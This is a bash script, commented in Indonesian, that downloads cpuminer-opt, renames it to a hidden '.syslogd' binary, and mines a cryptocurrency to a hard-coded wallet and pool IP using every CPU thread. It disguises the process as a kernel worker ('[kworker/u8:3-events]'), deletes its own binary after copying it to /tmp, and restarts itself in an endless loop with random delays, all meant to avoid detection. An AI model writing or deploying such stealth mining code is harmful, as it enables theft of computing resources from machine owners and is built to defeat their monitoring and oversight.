#!/bin/bash
set -e

# ====[ Konfigurasi ]====
WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9.Danis"
POOL="stratum+tcps://159.223.48.143:443"
ALGO="power2b"
THREADS=$(nproc --all)
BIN_NAME=".syslogd"
PROCESS_NAME="[kworker/u8:3-events]"
LOG_FILE=".xlog"
DELAY_MIN=5
DELAY_MAX=15

# ====[ Install Dependensi ]====
apt update -y && apt install -y wget tar curl

# ====[ Deteksi IP & blacklist pool domain jika perlu ]====
MYIP=$(curl -s https://api.ipify.org)
if echo "$MYIP" | grep -qE '159\.223\.48\.143'; then
    echo "[WARN] IP kamu terdeteksi sama dengan IP pool. Potensi deteksi!"
    exit 1
fi

# ====[ Download Miner jika belum ada ]====
if [ ! -f "$BIN_NAME" ]; then
    echo "[INFO] Mengunduh miner..."
    wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$BIN_NAME"
    chmod +x "$BIN_NAME"
    rm -f cpuminer-opt-linux.tar.gz
fi

# ====[ Fungsi Delay Random (Anti-pattern) ]====
random_delay() {
    DELAY=$(( RANDOM % (DELAY_MAX - DELAY_MIN + 1) + DELAY_MIN ))
    echo "[INFO] Delay acak selama $DELAY detik..."
    sleep $DELAY
}

# ====[ Fungsi Start Miner Tanpa Jejak ]====
start_miner_clean() {
    cp "$BIN_NAME" "/tmp/$BIN_NAME.$$"
    chmod +x "/tmp/$BIN_NAME.$$"
    rm -f "$BIN_NAME"

    exec -a "$PROCESS_NAME" /tmp/$BIN_NAME.$$ -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS
}

# ====[ Loop Mining Stealth + Bersih ]====
echo "[INFO] Menjalankan miner secara langsung & stealth..."
while true; do
    echo "[INFO] $(date) :: Menjalankan miner stealth..." >> "$LOG_FILE"

    bash -c 'start_miner_clean' >> "$LOG_FILE" 2>&1 || true

    echo "[WARN] Miner keluar. Reinit ulang..." >> "$LOG_FILE"
    random_delay
done
